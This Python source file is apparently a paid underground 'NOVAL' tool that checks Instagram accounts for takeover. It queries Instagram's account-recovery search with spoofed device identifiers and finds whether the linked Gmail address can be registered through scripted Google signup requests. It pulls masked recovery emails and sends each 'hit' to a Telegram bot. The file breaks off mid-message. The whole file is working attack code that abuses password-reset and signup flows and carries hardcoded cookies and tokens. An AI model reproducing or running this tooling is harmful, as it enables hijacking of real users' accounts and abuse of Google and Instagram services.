import requests
import uuid
import time
import random
import json
import string
import re
import os
import sys
import base64
import secrets
from datetime import datetime
from threading import Thread
from concurrent.futures import ThreadPoolExecutor

# ===== NOVAL PREMIUM TOOL =====
# Dev: @senselessme
# Channel: @novalportal

def typing_effect(text, delay=0.03):
    """Typing animation effect"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def loading_animation(duration=1.5):
    """Loading spinner animation"""
    spinner = ['◐', '◓', '◑', '◒']
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        sys.stdout.write(f'\r\033[96m{spinner[i % 4]} Verifying Access \033[0m')
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    sys.stdout.write('\r' + ' ' * 30 + '\r')

def gradient_text(text, start_color=92, end_color=96):
    """Gradient color effect (35-96 range)"""
    result = ""
    step = (end_color - start_color) / max(len(text) - 1, 1)
    for i, char in enumerate(text):
        color = int(start_color + step * i)
        result += f"\033[38;5;{color}m{char}"
    return result + "\033[0m"

def pulse_border(text, color=92):
    """Pulsing border effect"""
    borders = ["╔" + "═" * (len(text) + 2) + "╗",
               f"║ {text} ║",
               "╚" + "═" * (len(text) + 2) + "╝"]
    
    for _ in range(2):
        for i, border in enumerate(borders):
            if i == 0 or i == 2:
                sys.stdout.write(f"\r\033[{color}m{border}\033[0m")
            else:
                sys.stdout.write(f"\r\033[93m{border}\033[0m")
            sys.stdout.flush()
            time.sleep(0.15)
            if i < 2:
                sys.stdout.write("\n")
        time.sleep(0.3)
        os.system('cls' if os.name == 'nt' else 'clear')
        sys.stdout.write("\033[2J\033[H")
        time.sleep(0.2)

# ===== EXPIRY CHECK WITH ANIMATION =====
expiry_date = datetime(2027, 4, 22, 23, 59, 59)
now = datetime.now()

print("\n")
typing_effect(gradient_text("✦ NOVAL SECURITY CHECK ✦", 93, 96), 0.02)
print()
loading_animation(1.5)

if now > expiry_date:
    print("\n")
    typing_effect("\033[1;91m❌ ACCESS DENIED • TOOL EXPIRED\033[0m", 0.05)
    typing_effect("\033[93mContact: @senselessme\033[0m", 0.05)
    sys.exit()

print("\n")
typing_effect(f"\033[1;92m✅ ACCESS GRANTED • {gradient_text('NOVAL SYSTEM ONLINE', 92, 96)}\033[0m", 0.02)
time.sleep(0.5)

# ===== ASCII BANNER WITH ANIMATION =====
banner = """
\033[38;5;39m⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⠟⢡⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠙⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⡏⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡆⠈⣿⡄⠀⠀⠀⠀
⠀⠀⠀⢀⣴⡏⠃⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠁⣿⣄⠀⠀⠀
⠀⠀⢀⡾⠁⣇⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠇⠀⢠⡇⠹⣆⠀⠀
⠀⠀⢸⡁⠀⣿⠑⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀⠀⢩⡇⠀⢹⠀⠀
⠀⠀⢸⣧⡀⣿⣆⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⢀⣼⠇⢠⣾⠀⠀
⠀⢠⠾⡇⠁⠘⣿⡉⠀⠀⠙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠁⠀⠀⣹⡿⠀⠀⡿⢦⠀
⠀⡿⠀⢿⣆⠀⠱⣿⡆⠀⠀⠘⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠀⠀⠀⣾⣿⠁⢀⣼⠃⠘⡆
⠀⣿⡀⢈⢷⡀⠀⠱⡿⣦⣀⡀⢰⡹⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⢣⠀⢀⣠⣾⡿⠁⠀⣠⠏⠀⢰⡇
⣴⢿⡄⠈⢯⢿⡖⠀⣿⢿⢷⣍⣈⣷⡈⠙⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠞⠋⣰⡟⢀⣹⢿⣿⡇⠐⣺⣯⠇⠀⣸⢧
⣏⠈⢷⣄⠀⠳⣿⣦⣌⣻⣿⡏⠙⠻⣟⠀⠀⠈⠓⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠖⠋⠁⠀⢸⡿⠛⠉⢿⡿⢋⣠⣾⡿⠋⢀⣴⠏⠈
⠹⡄⠈⣿⣅⠀⠘⣿⣷⣍⢻⣇⣷⠄⠈⠳⣤⡀⠀⠀⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⠋⠀⠀⠀⣀⣴⠋⠀⢠⡇⣾⢋⣤⣿⡿⠁⢀⣽⠋⠀⡴
⠀⢻⠦⠹⣝⣷⡂⠈⣿⣿⠛⠻⣮⡃⠀⠀⣿⣿⡶⣄⣀⠀⠀⠙⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠞⠁⠀⢀⣀⡴⣾⣽⡿⠀⠀⣾⡿⠛⠻⣿⡟⠀⣲⣿⡽⠡⢾⠃
⠀⠈⣷⣄⠈⠳⣝⣧⡀⢿⣷⣀⠈⠙⠶⣄⡚⠽⣿⣿⡉⠙⠂⠀⠀⠹⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠁⠀⠀⠘⠋⣝⣿⣻⠕⣂⣴⠞⠉⠀⣠⣿⠇⣠⢾⡿⠋⢀⣰⡏⠀
⠀⠀⢸⠙⢯⣅⠀⢽⡯⣿⢷⣽⣂⠀⠀⣓⡯⣗⣾⣷⣄⡀⠀⠀⠀⠀⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⠀⣀⣽⣿⣖⡿⣟⡋⠀⢀⣺⣷⢿⣻⣿⠉⢀⣩⠟⢹⠃⠀
⠀⠀⠈⢧⡀⠙⣿⣇⣉⠻⣿⡋⠉⠓⠶⡤⢭⣽⣿⡅⠀⠀⠀⠀⣴⠞⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢶⣄⠀⠀⠀⠀⣽⣿⣭⠥⠴⠖⠋⠉⣻⡿⢋⣁⣽⡟⠁⣠⠟⠀⠀
⠀⠀⠀⠘⣿⡂⠈⠓⢯⣷⣿⣿⣾⠤⠀⠩⠭⢽⣿⣦⡴⠀⠀⠀⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡇⠀⠀⠰⣦⣾⣿⠭⠭⠁⢀⣬⣾⣿⣷⣿⠟⠋⠀⣺⡿⠀⠀⠀
⠀⠀⠀⠀⠈⠛⢶⣤⠀⠈⠻⣿⣿⣿⠶⠶⠶⣒⣿⣿⡶⠀⡀⠀⠈⠙⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠞⠉⠀⠀⣄⠠⣼⣿⣖⡒⠲⠶⢾⣿⣿⡿⠉⠀⢠⣴⠾⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠓⠒⣼⣟⡁⠀⠀⢀⣀⡭⣟⣿⣾⠁⠀⡀⠀⠀⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⣀⢀⢹⣿⣿⣿⣅⣀⠀⠀⠀⠘⣿⡔⠒⠋⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣃⣴⠞⠋⠁⠈⣛⣽⣿⣶⣾⠃⠀⠀⠀⠹⡄⠀⠀⠀⠀⠀⠀⡼⠋⠀⢀⢀⢹⣾⣿⣿⢯⡋⠁⠉⠙⢶⣄⣻⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⣶⡀⢠⠞⠁⠉⣵⣿⣿⣦⣼⡀⠀⠀⠙⢦⡀⠀⠀⣠⠞⠁⠀⠀⣸⣾⣾⢿⢷⣍⠀⠙⢦⣀⣰⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠻⢶⡏⠀⠀⡼⠁⢉⡿⠋⡽⠉⠉⠉⠓⠚⠉⠀⠀⠙⠒⠋⠉⠉⠹⡍⠿⣇⠁⠹⡆⠀⣈⢿⠾⠛⠁⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⠭⠿⣧⣖⣼⡧⢦⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⠢⢻⣔⣲⡿⢿⡽⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[0m
"""

# Animated banner reveal
banner_lines = banner.split('\n')
for i, line in enumerate(banner_lines):
    if line.strip():
        colors = [39, 45, 51, 57, 63, 69, 75, 81, 87]
        color = colors[i % len(colors)]
        sys.stdout.write(f"\033[38;5;{color}m{line}\033[0m\n")
    else:
        print()
    sys.stdout.flush()
    time.sleep(0.01)

time.sleep(0.5)

# ===== ANIMATED STATUS =====
print("\n")
typing_effect(f"\033[93m├── [DEV] \033[96m@senselessme\033[0m", 0.01)
typing_effect(f"\033[93m├── [CH] \033[96m@novalportal\033[0m", 0.01)
typing_effect(f"\033[93m└── [STATUS] \033[92mACTIVE ✓\033[0m", 0.01)

print("\n")
countdown = f"⏰ EXPIRY: {expiry_date.strftime('%d %b %Y, %I:%M:%S %p')}"
typing_effect(f"\033[93m{countdown}\033[0m", 0.02)

print("\n" + "═" * 50 + "\n")

# ===== YOUR EXISTING CODE CONTINUES HERE =====
# Your actual tool logic starts below

email = None
hits = 0
good = 0
taken = 0
bad = 0
limit = 0
info = {}
session = requests.session()
_session = requests.session()

# Colors
WHITE = "\033[1;37m"
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"
BOLD = "\033[1m"

def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

def animate_number(value, old_value, color, label):
    """Simple counter animation"""
    if value == old_value:
        return
    diff = value - old_value
    step = 1 if diff > 0 else -1
    for i in range(old_value, value + step, step):
        sys.stdout.write(f"\r{color}{label}: {WHITE}{i}{RESET}")
        sys.stdout.flush()
        time.sleep(0.002)
    print()

# ===== MODERN INPUT =====
print(f"\n{CYAN}{'─'*45}{RESET}")
print(f"{CYAN}│{WHITE}         🔐 NOVAL PAID TRAIL         {CYAN}│{RESET}")
print(f"{CYAN}{'─'*45}{RESET}\n")

token = input(f"{WHITE}🔑 TOKEN  > {CYAN}")
chat_id = input(f"{WHITE}💬 CHAT ID > {CYAN}")
print(f"{CYAN}{'─'*45}{RESET}\n")

def display():
    clear_screen()
    print(banner)
    print(f"""
{CYAN}═══════════════════════════════════════{RESET}
{CYAN}✦{WHITE} NOVAL HITS STATS {CYAN}✦{RESET}
{CYAN}═══════════════════════════════════════{RESET}

{GREEN}✓ HITS      {WHITE}: {hits}
{GREEN}✓ GOOD      {WHITE}: {good}
{RED}✗ BAD       {WHITE}: {bad}
{YELLOW}⚠ TAKEN     {WHITE}: {taken}
{YELLOW}⚠ LIMIT     {WHITE}: {limit}

{CYAN}═══════════════════════════════════════{RESET}
""")

def get_tl():
    while True:
        try:
            url = "https://accounts.google.com/_/signup/validatepersonaldetails"
            params = {'hl': "en-GB", '_reqid': "46000", 'rt': "j"}
            payload = {
              'continue': "https://accounts.google.com/ManageAccount?nc=1",
              'f.req': "[\"AEThLlw3_SjR2r7ZvRrESUg3K4e9eBWmlOC4rULBmw9UAcZVy1db7ezAlKKPXcOeac71VE9Ducrl\",null,null,null,null,0,0,\"aesowns\",\"aesowns\",null,0,null,1,[],1]",
              'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
              'cookiesDisabled': "false",
              'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
              'gmscoreversion': "null", 'flowName': "GlifWebSignIn",
              'checkConnection': "youtube:301", 'checkedDomains': "youtube",
              'pstMsg': "1", '': ""
            }
            headers = {
              'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
              'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
              'x-same-domain': "1", 'google-accounts-xsrf': "1",
              'sec-ch-ua-mobile': "?1", 'sec-ch-ua-platform': "\"Android\"",
              'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
              'origin': "https://accounts.google.com", 'x-client-data': "CP/xygE=",
              'sec-fetch-site': "same-origin", 'sec-fetch-mode': "cors",
              'sec-fetch-dest': "empty",
              'referer': "https://accounts.google.com/createaccount?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
              'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
              'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
            }
            response = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
            if response.status_code != 200:
                time.sleep(2)
                continue
            resp_text = response.text
            if len(resp_text) < 10:
                time.sleep(2)
                continue
            if resp_text.startswith(")]}'"):
                resp_text = resp_text[4:]
            data = json.loads(resp_text)
            tl_1 = data[0][1][2]
            
            url = "https://accounts.google.com/_/signup/validatebasicinfo"
            params = {'hl': "en-GB", 'TL': tl_1, '_reqid': "346000", 'rt': "j"}
            payload = {
              'continue': "https://accounts.google.com/ManageAccount?nc=1",
              'f.req': "[\"TL:"+ tl_1 +"\",2015,4,15,2,null,null,0,null,null,0,0]",
              'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
              'cookiesDisabled': "false",
              'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
              'gmscoreversion': "null", 'flowName': "GlifWebSignIn",
              'checkConnection': "youtube:301", 'checkedDomains': "youtube",
              'pstMsg': "1", '': ""
            }
            headers = {
              'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
              'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
              'x-same-domain': "1", 'google-accounts-xsrf': "1",
              'sec-ch-ua-mobile': "?1", 'sec-ch-ua-platform': "\"Android\"",
              'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
              'origin': "https://accounts.google.com", 'x-client-data': "CP/xygE=",
              'sec-fetch-site': "same-origin", 'sec-fetch-mode': "cors",
              'sec-fetch-dest': "empty",
              'referer': "https://accounts.google.com/signup/v2/birthdaygender?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL="+ tl_1,
              'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
              'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
            }
            response = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
            if response.status_code != 200:
                time.sleep(2)
                continue
            resp_text = response.text
            if resp_text.startswith(")]}'"):
                resp_text = resp_text[4:]
            data = json.loads(resp_text)
            tl = data[0][0][4].split("TL:")[1]
            with open("google.txt", "w") as w:
                w.write(tl)
        except:
            time.sleep(2)
            continue
        time.sleep(5)

Thread(target=get_tl, daemon=True).start()

def lookup(email):
    global bad, good
    url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    device = str(uuid.uuid4())
    family = str(uuid.uuid4())
    android = "android-" + secrets.token_hex(8)
    payload = {
      'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":"+ str(int(time.time())) +",\\\"aacjid\\\":\\\""+ str(uuid.uuid4()) +"\\\",\\\"aaccs\\\":\\\""+ secrets.token_urlsafe(32) +"\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\""+ email +"\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\""+ device +"\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\""+ str(uuid.uuid4()) +"\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\""+ android +"\",\"login_surface\":\"login_home\",\"waterfall_id\":\""+ str(uuid.uuid4()) +"\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\""+ family +"\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\""+ device +"\"}}",
      'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
      'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
    }
    headers = {
      'User-Agent': "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
      'accept-language': "en-IN, en-US",
      'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
      'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
      'x-ig-android-id': android, 'x-ig-app-id': "567067343352427",
      'x-ig-app-locale': "en_IN", 'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
      'x-ig-device-id': device, 'x-ig-family-device-id': family,
      'x-ig-timezone-offset': str(datetime.now().astimezone().utcoffset().total_seconds()),
      'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
      'x-pigeon-rawclienttime': str(time.time()),
      'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
    }
    response = requests.post(url, data=payload, headers=headers, timeout=20)
    if f"{email}" in response.text:
        good+=1
        display()
        check_gmail(email)
    elif 'Sorry, something' in response.text:
        limit+=1
        display()
    else:
        bad+=1
        display()

def check_gmail(email):
    global hits, taken
    usr = email.split("@")[0]
    try:
        with open("google.txt", "r") as ys:
            tl = ys.read().strip()
    except:
        time.sleep(2)
        return
    url = "https://accounts.google.com/_/signup/usernameavailability"
    params = {'hl': "en-GB", 'TL': tl, '_reqid': "446000", 'rt': "j"}
    payload = {
      'continue': "https://accounts.google.com/ManageAccount?nc=1",
      'f.req': "[\"TL:"+ tl +"\",\""+ usr +"\",0,0,1,null,1,2464]",
      'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
      'cookiesDisabled': "false",
      'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
      'gmscoreversion': "null", 'flowName': "GlifWebSignIn",
      'checkConnection': "youtube:301", 'checkedDomains': "youtube",
      'pstMsg': "1", '': ""
    }
    headers = {
      'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
      'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
      'x-same-domain': "1", 'google-accounts-xsrf': "1",
      'sec-ch-ua-mobile': "?1", 'sec-ch-ua-platform': "\"Android\"",
      'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
      'origin': "https://accounts.google.com", 'x-client-data': "CP/xygE=",
      'sec-fetch-site': "same-origin", 'sec-fetch-mode': "cors",
      'sec-fetch-dest': "empty",
      'referer': "https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL="+ tl,
      'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
      'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
    }
    response = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
    if '"gf.uar",1' in response.text:
        hits+=1
        display()
        gmail = get_masked(usr)
        send_to_bot(token, chat_id, gmail, usr, email)
    else:
        taken+=1
        display()
        
def get_masked(query):
    url = "https://www.instagram.com/api/graphql"
    payload = {
      'av': "0", '__d': "www", '__user': "0", '__a': "1", '__req': "f",
      '__hs': "20563.HYP:instagram_web_pkg.2.1...0", 'dpr': "3", '__ccg': "GOOD",
      '__rev': "1037676804", '__s': "nz2w5z:1vm2xs:94sap8",
      '__hsi': "7630740602831122681",
      '__dyn': "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C0Mo2swlo5q4U2zxe2GewGw9a361qw8Xwn8e87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK10xKi2K7E5y2-1mwa6byohw5ywuU1FU",
      '__csr': "hcfEI9NcRh48hnvNdsyaD6RnvOldSySDHBpKBLAF6ypAEzC4-ILahjF6S_ui-np4bmqhfR8gCaWFOmjgyiLt9EJ8FeiiGjFeaUO5XyjkBKUhByUGuhddpufW8yZeXx6aCxVxSaz8ycFbxVacxDCx2q8wwG8wHypp9UOawPADz8yaAgO9yVHwiqz89EhwCw05Cuw2eE1ooCU0gByU6IE1gUqU1ao0Vdw2tFnw1ud06Ca0M8fEx2UN7y4bEM3wo1JU2RwSyaOcayU6d7gy0A-9wi6320Ho0N60W8S02VS09vw0lWo",
      '__hsdp': "gSw8N0I1apBoBrysxGCA9cxkImy-u547Fu1lg13o6u8xy458eQ2Smm50y4FEC2Gce4mE64M09g80n9w6QG09SwjE0iCw5Nw",
      '__hblp': "05twAU5q0gum1MwuU24xS6FU98Sq0E8e88Uowda0Ek0S9U1hE0igwmuq6rwa608Gw4BwaK0BUhw9SfwXUcE34w2iE4W09iweK2O0jG1rx-8wZwaW0iq3u",
      '__sjsp': "gSw8N0I1apBoBrysxGCA8yElaxibVUkg9e0mi1Dy8ox1i3J0JBBxg8xaq9wTe",
      '__comet_req': "7", 'lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
      'jazoest': "22394", '__spin_r': "1037676804", '__spin_b': "trunk",
      '__spin_t': "1776670246", '__crn': "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
      'qpl_active_flow_ids': "516759801", 'fb_api_caller_class': "RelayModern",
      'fb_api_req_friendly_name': "CAAIGAccountSearchViewQuery",
      'server_timestamps': "true",
      'variables': "{\"params\":{\"event_request_id\":\"7ca5daae-5770-42dd-b77b-0cf23a865a7f\",\"next_uri\":\"\",\"search_query\":\""+ query +"\",\"waterfall_id\":\"553aadae-3ec5-4031-8395-efbabcc670ce\"}}",
      'doc_id': "26178667145161478",
      'fb_api_analytics_tags': "[\"qpl_active_flow_ids=516759801\"]"
    }
    headers = {
      'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
      'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
      'sec-ch-ua-model': "\"\"", 'x-ig-app-id': "936619743392459",
      'x-ig-max-touch-points': "5", 'sec-ch-ua-mobile': "?0",
      'x-fb-friendly-name': "CAAIGAccountSearchViewQuery",
      'x-fb-lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
      'sec-ch-ua-platform-version': "\"\"", 'x-asbd-id': "359341",
      'sec-ch-ua-full-version-list': "\"Chromium\";v=\"139.0.7339.0\", \"Not;A=Brand\";v=\"99.0.0.0\"",
      'sec-ch-prefers-color-scheme': "dark", 'x-csrftoken': "o_6jxh33ZvsQ2eFMyRaM_q",
      'sec-ch-ua-platform': "\"Linux\"", 'origin': "https://www.instagram.com",
      'sec-fetch-site': "same-origin", 'sec-fetch-mode': "cors",
      'sec-fetch-dest': "empty", 'referer': "https://www.instagram.com/accounts/password/reset/",
      'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
      'Cookie': "csrftoken=o_6jxh33ZvsQ2eFMyRaM_q; datr=YMnlaTJAraHY5ADdYH8UqsTG; ig_did=2046A480-DF50-4660-A5CD-DC58F57C7A1C; mid=aeXJYAABAAGoDWzGwrGALDqzE3Np; dpr=3.558248996734619; wd=774x749"
    }
    response = requests.post(url, data=payload, headers=headers, timeout=20)
    email = next((i["contact_point"] for i in response.json()["data"]["caa_ar_ig_account_search"]["contact_points"] if i["type"] == "EMAIL"), None)
    return email if email else None

def send_to_bot(token, chat_id, gmail, usr, email):
    username = usr
    data = info.get(username, {})
    business = data.get('is_business', None)
    followers = data.get('follower_count', None)
    followings = data.get('following_count', None)
    posts = data.get('media_count', None) or 0
    name = data.get('full_name', None)
    biography = data.get('biography', None)
    business = business if business else 'None'
    followers = followers if followers else 'None'
    followings = followings if followings else 'None'
    name = name if name else 'None'
    biography = biography if biography else 'None'
    mail = gmail if gmail else 'None'
    meta = 'True' if posts > 2 else 'False'
    try:
        content = f"""
【✦ NOVAL HIT ✦】

◈ 𝐌𝐄𝐓𝐀       ◈ {meta}
◈ 𝐍𝐀𝐌𝐄       ◈ {name}
◈ 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄   ◈ @{username}
◈ 𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒  ◈ {followers}
◈ 𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆  ◈ {followings}
